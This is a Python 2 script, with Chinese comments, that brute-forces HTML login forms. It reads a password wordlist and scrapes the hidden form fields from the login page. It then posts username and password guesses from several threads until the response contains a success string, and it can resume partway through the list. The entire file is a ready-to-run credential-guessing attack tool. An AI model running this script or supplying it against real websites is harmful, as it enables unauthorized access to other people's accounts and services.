#! usr/bin/env python
#coding:utf-8

__author__ = 'cmustard'
"""
网页form表单暴力破解
"""

import threading
import urllib2
import urllib
import Queue
import cookielib
import HTMLParser
import optparse
import os.path

#申明一个全局变量来判断是否查找成功
found = False
#申明一个全局变量resume，用于在断开会话后进行断点查询
resume=False
#用于判断是否登录成功
success = 'Hi Super User,'
#线程最大数
maxthreading=5

#用于提交的目标域名地址
submit_addr=None


class brute(object):
    
    def __init__(self,user,words,host):
        self.user=user
        self.words=words
        self.host=host
        self.found=found
        

    def web_brute(self):
        "爆破，调用BruteParser类返回需要修改的标签的信息，然后进行修改"

        while not self.words.empty() and not self.found:
            password = self.words.get().rstrip()
            try:
                jar = cookielib.CookieJar()
                
                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
                reponse=opener.open(self.host)
                page = reponse.read()

                print "Trying:%s  :  %s (%d left)"%(self.user,password,self.words.qsize())

                #解析隐藏区域，调用myhtmlparser类
                myhtml=myhtmlpaser()
                myhtml.feed(page)

                post_tags = myhtml.tag_result



                #添加我们的密码区域
                #post的时候。主体部分参数的名称。如username=admin&password=123456 那么参数名称有username和password
                post_tags['username'] = self.user
                post_tags["password"] = password



                login_data = urllib.urlencode(post_tags)
                login_response = opener.open(submit_addr,login_data)

                login_result = login_response.read()
                opener.close()
                # print login_result

                #
               
                if success in login_result:
                    self.found=True
                    print '[*] Bruteforce successful'
                    print "[*] Username:%s" % self.user
                    print "[*] Password:%s" % password
                    print "[*] Waiting for other threads to exits......"
            except Exception as e:
                print e
                print password
                exit(0)


        

    def run_web_brute(self):
        "run_bruteforce(self):这是一个多线程函数，用于调用函数web_bruster"
        for i in range(maxthreading):
            th=threading.Thread(target=self.web_brute)
            th.start()
        
        
    


class myhtmlpaser(HTMLParser.HTMLParser):
    "myhtmlpaser类，该类继承了HTMLParser类"
    def __init__(self):
        HTMLParser.HTMLParser.__init__(self)
        #申明一个字典存储登录属性和值
        self.tag_result={}

    def handle_starttag(self,tag,attrs):
        '''这是针对有属性name和value的标签准备的，及就是那些所谓隐藏区域，即hidden部分"
            因为hidden部可能包含了重要的cookie信息'''
        if tag == 'input':
            tag_name=None
            tag_value=None
            for name,value in attrs:
                if name=='name':
                    tag_name=value
                if name=="value":
                    tag_value=value
                if tag_name is not None:
                    self.tag_result[tag_name]=value
        '''<input type="submit" name="0MKKey" value="连接网络">　
        这个中的'0MKKEY=连接网络'，在链接网络的时候会跟用户名一起发送给目标网站
        '''




def brute_word(filepath,resume_word=None):
    "加载密码字典"
    global resume
    if not os.path.exists(filepath):
        print "filepath is not exist"
        exit(0)
    words = Queue.Queue()
    with open(filepath,"r") as f:
        content = f.readlines()
        # print content

    for word in content:
        words.put(word)

    if resume_word is not None:
        resume =True
        print "begin break resration "
        while resume:
            temp = words.get()
            if temp == resume_word:
                resume = False
                break

    return words

def main():
    "主函数，用于接受命令行的参数"
    global maxthreading
    global submit_addr
    usage="Usage%prog   "
    parser = optparse.OptionParser(usage)
    parser.add_option("-H","--host",action="store",dest="host",help="target domain or ip")
    parser.add_option("-f","--file",action="store",dest="filepath",help="dictionary'path ")
    parser.add_option("-u","--user",action="store",dest="user",help="uer")
    parser.add_option('-r','--resume',action='store',dest='resume_word',help="break resration")
    parser.add_option('-t',"--thread",action="store",dest='maxthreading',help="maxthreading")
    parser.add_option("-s","--submit",action="store",dest="submit_add",help="useranme submit address")
    (options,args)=parser.parse_args()
    host=options.host
    filepath=options.filepath
    user=options.user
    resume_word=options.resume_word
    if options.maxthreading is not None:
        maxthreading = options.maxthreading
    submit_addr = options.submit_add

    if (host==None) | (filepath==None) | (user == None) :
        
        print usage
        exit(0)
    if not host.startswith("http://") and not host.startswith("https://"):
        print usage
        exit(0)
    if submit_addr is None:
        submit_addr = host
    #申明类的实例
    words = brute_word(filepath)
    # print words
    brute_instance=brute(user,words,host)
    brute_instance.run_web_brute()



if __name__=="__main__":
    main()
